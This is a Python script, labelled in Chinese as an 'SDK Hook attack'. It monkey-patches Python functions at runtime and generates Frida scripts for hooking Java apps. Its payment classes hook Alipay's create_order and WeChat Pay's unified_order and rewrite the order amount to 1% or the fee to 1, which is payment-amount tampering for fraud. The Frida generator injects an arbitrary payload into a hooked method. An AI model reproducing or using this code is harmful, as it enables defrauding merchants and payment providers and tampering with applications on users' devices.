#!/usr/bin/env python3
"""SDK Hook 攻击"""
import sys
from typing import Callable

class SDKHook:
    """SDK Hook 攻击"""

    def __init__(self):
        self.original_functions = {}
        self.hooks = {}

    def hook_function(self, module_name: str, function_name: str, hook: Callable) -> bool:
        try:
            module = sys.modules.get(module_name)
            if not module:
                __import__(module_name)
                module = sys.modules[module_name]

            original = getattr(module, function_name)
            self.original_functions[f"{module_name}.{function_name}"] = original

            def wrapper(*args, **kwargs):
                return hook(original, *args, **kwargs)

            setattr(module, function_name, wrapper)
            self.hooks[f"{module_name}.{function_name}"] = hook
            return True
        except Exception as e:
            print(f"Hook failed: {e}")
            return False

    def unhook(self, module_name: str, function_name: str):
        key = f"{module_name}.{function_name}"
        if key in self.original_functions:
            module = sys.modules[module_name]
            setattr(module, function_name, self.original_functions[key])
            del self.hooks[key]

class PaymentSDKHook(SDKHook):
    def hook_alipay(self):
        def alipay_hook(original, *args, **kwargs):
            print(f"[HOOK] Alipay: {args}, {kwargs}")
            if 'amount' in kwargs:
                kwargs['amount'] = kwargs['amount'] * 0.01
            return original(*args, **kwargs)
        self.hook_function("alipay", "create_order", alipay_hook)

    def hook_wechat(self):
        def wechat_hook(original, *args, **kwargs):
            print(f"[HOOK] WeChat pay")
            if 'total_fee' in kwargs:
                kwargs['total_fee'] = 1
            return original(*args, **kwargs)
        self.hook_function("wechatpay", "unified_order", wechat_hook)

class FridaStyleHook:
    @staticmethod
    def generate_frida_script(target_function: str, payload: str) -> str:
        script = 'Java.perform(function() {\n'
        script += f'    var target = Java.use("{target_function}");\n'
        script += '    target.implementation = function() {\n'
        script += f'        console.log("[*] Hooked: {target_function}");\n'
        script += '        var result = this.' + target_function.split(".")[-1] + '.apply(this, arguments);\n'
        script += f'        {payload}\n'
        script += '        return result;\n'
        script += '    };\n'
        script += '});\n'
        return script
